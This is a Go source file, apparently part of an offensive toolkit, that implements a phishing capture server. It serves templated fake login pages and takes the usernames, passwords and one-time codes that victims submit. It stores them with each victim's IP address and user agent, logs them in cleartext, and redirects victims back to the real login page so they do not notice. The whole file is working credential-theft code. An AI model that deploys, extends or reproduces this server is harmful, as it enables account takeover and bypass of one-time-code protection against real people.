package phish

import (
	"context"
	"fmt"
	"html"
	"log/slog"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/store"
)

// CaptureServer is an HTTP server that serves phishing pages and harvests
// submitted credentials. It also answers OPTIONS/health for proxying.
type CaptureServer struct {
	Listen string
	DB     *store.Store
	Bus    *events.Bus
	Log    *slog.Logger

	srv    *http.Server
	routes *http.ServeMux
}

// NewCaptureServer builds a capture server. Listen should include the port,
// e.g. ":8081".
func NewCaptureServer(listen string, db *store.Store, bus *events.Bus, log *slog.Logger) *CaptureServer {
	if listen == "" {
		listen = ":8081"
	}
	s := &CaptureServer{Listen: listen, DB: db, Bus: bus, Log: log}
	s.routes = http.NewServeMux()
	s.routes.HandleFunc("/phish/", s.handlePhish)
	s.routes.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	})
	return s
}

// Handler returns the HTTP handler (used to mount the capture server inside a
// proxy listener or standalone).
func (s *CaptureServer) Handler() http.Handler {
	return s.routes
}

// Start launches the HTTP server.
func (s *CaptureServer) Start() error {
	s.srv = &http.Server{
		Addr:         s.Listen,
		Handler:      s.routes,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}
	ln, err := net.Listen("tcp", s.Listen)
	if err != nil {
		return fmt.Errorf("phish listen %s: %w", s.Listen, err)
	}
	go func() { _ = s.srv.Serve(ln) }()
	return nil
}

// Stop shuts the server down.
func (s *CaptureServer) Stop() {
	if s.srv != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		_ = s.srv.Shutdown(ctx)
		s.srv = nil
	}
}

// handlePhish routes /phish/<id> and /phish/<id>/submit.
func (s *CaptureServer) handlePhish(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/phish/")
	parts := strings.SplitN(path, "/", 2)
	id := NormalizeTemplateID(parts[0])

	if !IsKnownTemplate(id) {
		http.NotFound(w, r)
		return
	}

	submit := len(parts) == 2 && parts[1] == "submit"
	switch {
	case submit:
		s.capture(w, r, id)
	default:
		s.servePage(w, r, id)
	}
}

func (s *CaptureServer) servePage(w http.ResponseWriter, r *http.Request, id string) {
	f := DefaultFields(id)
	f.Action = phishAction(r, id)
	f.Orig = html.EscapeString(r.URL.Query().Get("orig"))
	if f.Orig == "" {
		f.Orig = ""
	}
	htmlOut, err := Render(id, f)
	if err != nil {
		http.Error(w, "template error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = w.Write([]byte(htmlOut))
}

func (s *CaptureServer) capture(w http.ResponseWriter, r *http.Request, id string) {
	if err := r.ParseForm(); err != nil {
		http.Error(w, "bad form", http.StatusBadRequest)
		return
	}
	username := firstOf(r.Form, "username", "user", "email", "login")
	password := firstOf(r.Form, "password", "pass", "pwd")
	otp := firstOf(r.Form, "otp", "code", "token")
	orig := r.Form.Get("orig")

	cred := store.Cred{
		Service:  "phish",
		Username: username,
		Password: password,
		Extra:    otp,
		Host:     r.Host,
		VictimIP: clientIP(r),
		VictimUA: r.UserAgent(),
		Source:   "phish:" + id,
		Time:     time.Now(),
	}
	s.DB.AddCred(cred)
	msg := fmt.Sprintf("credential.phished (%s): %s / %s from %s", id, username, password, clientIP(r))
	s.DB.LogEvent(events.TopicCredPhished, msg)
	if s.Bus != nil {
		s.Bus.Emit(events.TopicCredPhished, cred)
	}
	if s.Log != nil {
		s.Log.Info("phished credential", "template", id, "victim", clientIP(r))
	}

	// Redirect the victim to the original login page so they believe the
	// attempt failed/worked and keep browsing (session stays alive).
	if orig == "" {
		orig = "/"
	}
	http.Redirect(w, r, orig, http.StatusFound)
}

// phishAction builds the submission URL for a page request.
func phishAction(r *http.Request, id string) string {
	host := r.Host
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s/phish/%s/submit", scheme, host, id)
}

func firstOf(vals map[string][]string, keys ...string) string {
	for _, k := range keys {
		if vs, ok := vals[k]; ok && len(vs) > 0 && vs[0] != "" {
			return vs[0]
		}
	}
	return ""
}

// clientIP extracts the remote IP from X-Forwarded-For when proxied.
func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		if i := strings.IndexByte(xff, ','); i > 0 {
			return strings.TrimSpace(xff[:i])
		}
		return strings.TrimSpace(xff)
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}
